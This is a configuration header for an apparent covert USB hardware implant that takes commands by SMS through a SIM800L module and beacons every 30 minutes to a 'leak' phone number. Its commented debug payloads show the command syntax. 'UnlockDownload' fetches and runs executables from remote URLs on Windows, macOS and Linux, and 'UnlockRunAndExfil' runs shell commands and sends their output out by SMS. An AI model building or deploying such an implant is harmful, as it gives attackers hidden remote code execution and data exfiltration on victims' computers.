#pragma once

#include "C_USBhost.h"
#include <SoftwareSerial.h>

/*******************************************/
/******* START CONFIGURATION OPTIONS *******/
/*******************************************/
#define LEAK_PHONE_NUMBER "+XXXXXXXXXXX"		// Set to the leaking phone number
#define IMPLANT_NAME "Implant 1"				// Identify device when multiple used			
//#define DEBUG 								// Un-comment if you want to build with DEBUG.

// Used to debug the code with an arduino without a SIM module and without an USB host
//#define DEBUGWITHOUTSIM true
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##win##PASSWORD##https://s3.amazonaws.com/testing/hello.exe"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##osx##PASSWORD##https://s3.amazonaws.com/testing/hello_osx"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/testing/hello_lin"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##win##PASSWORD##mkdir %TEMP%\\malware"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##osx##PASSWORD##uname -a"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##lnx##PASSWORD##touch /tmp/malware"

/*******************************************/
/******* END CONFIGURATION OPTIONS *********/
/*******************************************/


extern C_USBhost USBhost;
extern SoftwareSerial SMSSERIAL;

#define SEPARATOR "##"

#define SMS_CHAR_LIMIT 140
#define MAX_BUFFER_SIZE 1024
#define BAUD_RATE_SIM800L 57600                    
#define BAUD_RATE_USB_HOST_BOARD 115200             
#define BAUD_RATE_SERIAL 115200

#ifdef DEBUG
// Time in minutes we will send a beacon to let know the implant is alive
#define BEACON_TIME 1 
#else
#define BEACON_TIME 30
#endif                      
